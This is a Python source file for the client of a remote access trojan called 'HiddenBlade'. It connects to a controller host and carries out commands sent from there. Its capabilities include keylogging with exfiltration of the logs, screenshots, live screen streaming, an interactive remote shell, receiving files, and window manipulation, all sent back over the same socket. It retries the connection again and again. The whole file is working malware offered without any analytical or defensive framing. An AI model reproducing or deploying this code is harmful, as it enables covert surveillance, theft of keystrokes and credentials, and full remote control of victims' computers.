import sys
from threading import Thread
from util.hidden_blade_components import HiddenBladeComponent
from vidstream import ScreenShareClient
import os
import socket

class Client(socket.socket):
    def __init__(self) -> None:
        super().__init__(socket.AF_INET,socket.SOCK_STREAM)
        self.connect(("192.168.1.5",1881))
        Thread(target=self.comminication).start()

    def comminication(self):
        cc = HiddenBladeComponent.ClientCommands()
        while(True):
            commands = self.recv(1024).decode()
            if commands == "get-info":
                self.send(str(cc.get_info()).encode())

            elif commands == "k-lgr":
                cc.makeKeylogger()
                self.send(b"Finish")
                with open("log.txt","r",encoding="utf-8") as f:
                    self.send(f.read().encode())
                os.remove("log.txt")

            elif commands == "get-screen_s":
                cc.screenShot()
                with open(f"{HiddenBladeComponent.test_konumu}ss.png","rb") as ss:
                    data = ss.read()
                    data_lenght = len(data)
                    self.send(data_lenght.to_bytes(4,'big'))
                    self.send(data)
                os.remove(f"{HiddenBladeComponent.test_konumu}ss.png")
            
            elif commands == "i-shell":
                while True:
                    cmd = self.recv(1024).decode()
                    if cmd != "e--":
                        resp = cc.terminalCommands(cmd)
                        result = { str(len(resp)) : resp }
                        self.send(str(result).encode())
                        self.send(resp.encode())

                    if cmd == "e--":
                        cc.terminalCommands(cmd)
                        self.send(b"exited")
                        break
            
            elif commands.startswith("send-file"):
                file_name = self.recv(1024).decode()
                f_splt = file_name.split()
                with open(os.path.abspath(f_splt[0]),"wb") as g:
                    remaining = int.from_bytes(self.recv(4), 'big')
                    while remaining:
                        rbuf = self.recv(min(remaining, 4096))
                        remaining -= len(rbuf)
                        g.write(rbuf)

            elif commands == "get-screen_r":
                screen = ScreenShareClient(host="192.168.1.5",port=1881)
                Thread(target=screen.start_stream,daemon=True).start()

            elif commands == "win-map":
                while True:
                    cmd = self.recv(1024).decode()
                    if cmd != "e--":
                        try:
                            self.send(cc.winManupilation(cmd).encode())
                        except:
                            self.send(b" ")
                    else:
                        self.send(b"exited")
                        break
            elif commands == "exit":
                sys.exit(0)
def main():
    try:
        Client()
    except:
        main()
main()